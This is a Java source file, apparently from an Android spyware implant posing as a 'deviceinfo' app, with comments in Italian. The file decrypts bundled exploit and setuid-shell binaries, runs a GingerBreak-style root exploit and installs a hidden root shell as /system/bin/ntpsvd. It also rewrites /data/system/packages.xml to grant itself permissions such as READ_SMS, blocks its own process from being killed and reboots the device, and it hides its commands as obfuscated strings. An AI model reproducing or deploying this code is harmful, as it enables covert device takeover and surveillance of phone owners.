package com.android.deviceinfo;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.widget.Toast;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.capabilities.PackageInfo;
import com.android.deviceinfo.crypto.Keys;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.Execute;
import com.android.deviceinfo.util.Utils;

public class Root {
	private static final String TAG = "Root";

	static public boolean isNotificationNeeded() {
		if (Cfg.OSVERSION.equals("v2") == false) {
			int sdk_version = android.os.Build.VERSION.SDK_INT;

			if (sdk_version >= 11 /* Build.VERSION_CODES.HONEYCOMB */) {
				return true;
			}
		}
		
		return false; 
	}

	static public void adjustOom() {
		if (Status.haveRoot() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
			}

			return;
		}
		
		int pid = android.os.Process.myPid();
		// 32_34=#!/system/bin/sh
		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
		// /proc/
		// 32_36=/oom_score_adj\"
		String script = Messages.getString("32_34")+ "\n" + Messages.getString("32_35") + pid + Messages.getString("32_36") + "\n";
		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
		// 32_38=/oom_adj\"
		script += Messages.getString("32_37") + pid + Messages.getString("32_38") + "\n";

		if (Cfg.DEBUG) {
			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
		}

		if (createScript("o", script) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): failed to create OOM script"); //$NON-NLS-1$
			}

			return;
		}

		Execute ex = new Execute();
		ex.execute(Status.getAppContext().getFilesDir() + "/o");

		removeScript("o");

		if (Cfg.DEBUG) {
			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
		}
	}

	// Prendi la root tramite superuser.apk
	static public void superapkRoot() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String suidext = Messages.getString("32_6"); // statusdb

		if (Status.haveSu() == false) {
			return;
		}

		// exploit
		// InputStream stream = resources.openRawResource(R.raw.statuslog);

		// suidext
		InputStream stream = Utils.getAssetStream("s.bin");

		try {
			// 0x5A3D10448D7A912A
			fileWrite(suidext, stream, Cfg.RNDDB);

			// Proviamoci ad installare la nostra shell root
			if (Cfg.DEBUG) {
				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
				Check.log(TAG + " (superapkRoot): " + Messages.getString("32_31")); //$NON-NLS-1$
			}

			Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/" + suidext);

			// 32.29 = /data/data/com.android.service/files/statusdb rt
			// 32_34=#!/system/bin/sh\n
			String script = Messages.getString("32_34") + "\n" + Messages.getString("32_29") + "\n";
			if (Cfg.DEBUG) {
				Check.log(TAG + " (superapkRoot), script: " + script);
			}

			if (Root.createScript("s", script) == true) {
				//32_7=/system/bin/chmod 755 
				Process runScript = Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/s");
				int ret = runScript.waitFor();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (superapkRoot) execute 1: " + Messages.getString("32_7") + path + "/s" + " ret: "
							+ ret);
				}

				// su -c /data/data/com.android.service/files/s
				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32_31"));
				ret = localProcess.waitFor();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (superapkRoot) execute 2: " + Messages.getString("32_31") + " ret: " + ret);
				}
				
				Root.removeScript("s");
			}else{
				if (Cfg.DEBUG) {
					Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
				}
			}
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (superapkRoot): Exception"); //$NON-NLS-1$
			}

			return;
		}
	}

	// name WITHOUT path (script is generated inside /data/data/<package>/files/
	// directory)
	static public boolean createScript(String name, String script) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
		}

		try {
			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_PRIVATE);
			fos.write(script.getBytes());
			fos.close();

			Execute ex = new Execute();
			ex.execute("chmod 755 " + Status.getAppContext().getFilesDir() + name);

			return true;
		} catch (Exception e) {
			if (Cfg.EXP) {
				Check.log(e);
			}

			return false;
		}
	}

	static public void removeScript(String name) {
		File rem = new File(Status.getAppContext().getFilesDir() +"/" + name);

		if (rem.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeScript) deleting: %s", name);
			}
			rem.delete();
		}else{
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions) file does not exist, cannot delete: %s", name);
			}
		}
	}

	public void getPermissions() {
		// Abbiamo su?
		Status.setSu(PackageInfo.hasSu());

		// Abbiamo la root?
		Status.setRoot(PackageInfo.checkRoot());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
					+ Keys.self().wantsPrivilege());
		}

		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions), ask the user");
			}
			// Ask the user...
			Root.superapkRoot();

			Status.setRoot(PackageInfo.checkRoot());

			if (Cfg.DEBUG) {
				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions), don't ask");
			}
		}

		// Avoid having the process killed for using too many resources
		Root.adjustOom();
	}

	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
			FileNotFoundException {
		try {
			InputStream in = decodeEnc(stream, passphrase);

			final FileOutputStream out = Status.getAppContext().openFileOutput(exploit, Context.MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;

			while ((numRead = in.read(buf)) >= 0) {
				out.write(buf, 0, numRead);
			}

			out.close();
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fileWrite): " + ex);
			}

			return false;
		}

		return true;
	}

	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {

		SecretKey key = MessagesDecrypt.produceKey(passphrase);

		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
			Check.log(TAG + " (decodeEnc): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
		}

		// 17.4=AES/CBC/PKCS5Padding
		Cipher cipher = Cipher.getInstance(Messages.getString("17_4")); //$NON-NLS-1$
		final byte[] iv = new byte[16];
		Arrays.fill(iv, (byte) 0);
		IvParameterSpec ivSpec = new IvParameterSpec(iv);

		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
		CipherInputStream cis = new CipherInputStream(stream, cipher);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
		}

		return cis;
	}

	static public boolean root() {
		try {
			if (!Cfg.EXP) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
				}

				return false;
			}

			final String crashlog = Messages.getString("32_4"); //$NON-NLS-1$
			final String exploit = Messages.getString("32_5"); //$NON-NLS-1$
			final String suidext = Messages.getString("32_6"); //$NON-NLS-1$
			boolean isRoot = false;

			// Creiamo il crashlog
			final FileOutputStream fos = Status.getAppContext().openFileOutput(crashlog, Context.MODE_PRIVATE);
			fos.close();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (root): saving statuslog"); //$NON-NLS-1$
			}

			// exploit
			InputStream stream = Utils.getAssetStream("e.bin");

			// "0x5A3D10448D7A912B"
			Root.fileWrite(exploit, stream, Cfg.RNDLOG);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (root): saving exploit e.bin"); //$NON-NLS-1$
			}

			// shell
			stream = Utils.getAssetStream("s.bin");

			// 0x5A3D10448D7A912A
			Root.fileWrite(suidext, stream, Cfg.RNDDB);

			// Eseguiamo l'exploit
			final File filesPath = Status.getAppContext().getFilesDir();
			final String path = filesPath.getAbsolutePath();

			Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32_8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
			Runtime.getRuntime().exec(Messages.getString("32_9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$

			String exppath = path + "/" + exploit; //$NON-NLS-1$

			ExploitRunnable r = new ExploitRunnable(exppath);
			Thread t = new Thread(r);
			if (Cfg.DEBUG) {
				t.setName(r.getClass().getSimpleName());
			}
			t.start();

			// Attendiamo al max 100 secondi il nostro file setuid root
			final long now = System.currentTimeMillis();

			while (System.currentTimeMillis() - now < 100 * 1000) {
				Utils.sleep(1000);

				if (PackageInfo.checkRoot()) {
					isRoot = true;
					break;
				}
			}

			if (r.getProcess() != null) {
				r.getProcess().destroy();
			}

			if (isRoot) {
				// Di' a suidext di fare il kill di VOLD per due volte
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32_10")); //$NON-NLS-1$ //$NON-NLS-2$

				// Copia la shell root, ovvero il suidext, in /system/bin/ntpsvd
				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32_11")); //$NON-NLS-1$ //$NON-NLS-2$

				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
				}

				// Riavviamo il telefono
				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
				}
			}

			return isRoot;

		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
			}

			return false;
		}
	}

	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
	// le stringe nella librunner.so. Fixare il fatto che l'app va
	// in crash se la funzione torna 0 o 1 e si ferma il servizio

	/*
	 * Verifica e prova ad ottenere le necessarie capabilities
	 * 
	 * Return: 0 se c'e' stato un errore 1 se le cap sono state ottenute ma si
	 * e' in attesa di un reboot 2 se gia' abbiamo le cap necessarie
	 */
	public static int overridePermissions() {
		final String manifest = Messages.getString("32_15"); //$NON-NLS-1$ 

		// Controlliamo se abbiamo le capabilities necessarie
		PackageManager pkg = Status.getAppContext().getPackageManager();

		if (pkg != null) {
			// android.permission.READ_SMS, com.android.service
			int perm = pkg.checkPermission(Messages.getString("32_16"), Messages.getString("32_17"));

			if (perm == PackageManager.PERMISSION_GRANTED) {
				return 2;
			}
		}

		try {
			Execute ex = new Execute();

			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
			// Creiamo la directory files
			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);

			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
			// /system/bin/ntpsvd fhc /data/system/packages.xml
			// /data/data/com.android.service/files/packages.xml
			ex.execute(Messages.getString("32_18"));
			Utils.sleep(600);
			// /system/bin/ntpsvd pzm 666
			// /data/data/com.android.service/files/packages.xml
			ex.execute(Messages.getString("32_19"));

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/test
			File tmp = new File(Messages.getString("32_20"));

			if (tmp.exists() == true) {
				tmp.delete();
			}

			// Aggiorniamo il file
			// packages.xml
			FileInputStream fin = Status.getAppContext().openFileInput(Messages.getString("32_21"));
			// com.android.service
			PackageInfo pi = new PackageInfo(fin, Messages.getString("2_17"));

			String path = pi.getPackagePath();

			if (path.length() == 0) {
				return 0;
			}

			// Vediamo se gia' ci sono i permessi richiesti
			if (pi.checkRequiredPermission() == true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
				}

				// Rimuoviamo la nostra copia
				// /data/data/com.android.service/files/packages.xml
				File f = new File(Messages.getString("32_22"));

				if (f.exists() == true) {
					f.delete();
				}

				return 2;
			}

			// perm.xml
			pi.addRequiredPermissions(Messages.getString("32_23"));

			// .apk con tutti i permessi nel manifest

			// TODO riabilitare le righe quando si reinserira' l'exploit
			// InputStream manifestApkStream =
			// getResources().openRawResource(R.raw.layout);
			// fileWrite(manifest, manifestApkStream,
			// Cfg.);

			// Copiamolo in /data/app/*.apk
			// /system/bin/ntpsvd qzx \"cat
			// /data/data/com.android.service/files/layout >
			ex.execute(Messages.getString("32_24") + path + "\"");

			// Copiamolo in /data/system/packages.xml
			// /system/bin/ntpsvd qzx
			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
			ex.execute(Messages.getString("32_25"));

			// Rimuoviamo la nostra copia
			// /data/data/com.android.service/files/packages.xml
			File f = new File(Messages.getString("32_22"));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/perm.xml
			f = new File(Messages.getString("32_26"));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo l'apk con tutti i permessi
			// /data/data/com.android.service/files/layout
			f = new File(Messages.getString("32_27"));

			if (f.exists() == true) {
				f.delete();
			}

			// Riavviamo il telefono
			// /system/bin/ntpsvd reb
			ex.execute(Messages.getString("32_28"));
		} catch (Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
			}

			return 0;
		}

		return 1;
	}

	public void runGingerBreak() {
		boolean isRoot = Status.haveRoot();

		if (isRoot == false) {
			// Don't exploit if we have no SD card mounted
			if (android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED)) {
				// isRoot = root();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onStart) no media mounted"); //$NON-NLS-1$
				}
			}
		}

		if (isRoot == false) {
			// Ask the user...
			Root.superapkRoot();

			isRoot = PackageInfo.checkRoot();
		}

		if (isRoot == true) {
			int ret = Root.overridePermissions();

			Toast.makeText(Status.getAppContext(), "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$

			switch (ret) {
			case 0:
			case 1:
				return; // Non possiamo partire

			case 2: // Possiamo partire
			default:
				break;
			}
		}

		Status.setRoot(isRoot);
	}

	// Exploit thread
	static class ExploitRunnable implements Runnable {
		private Process localProcess;
		private final String exppath;

		public ExploitRunnable(String exppath) {
			this.exppath = exppath;
		}

		public Process getProcess() {
			return localProcess;
		}

		public void run() {
			try {
				localProcess = Runtime.getRuntime().exec(exppath);

				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
				String line = null;

				while ((line = stdout.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stdout): " + line); //$NON-NLS-1$
					}
				}

				while ((line = stderr.readLine()) != null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (stderr): " + line); //$NON-NLS-1$
					}
				}

				try {
					localProcess.waitFor();
				} catch (final InterruptedException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
						Check.log(e);//$NON-NLS-1$
					}
				}

				final int exitValue = localProcess.exitValue();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (waitFor): exitValue " + exitValue); //$NON-NLS-1$
				}

				stdin.close();
				stdout.close();
				stderr.close();

			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				localProcess = null;
				if (Cfg.DEBUG) {
					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
					Check.log(e);//$NON-NLS-1$
				}
			}
		}

	}
}
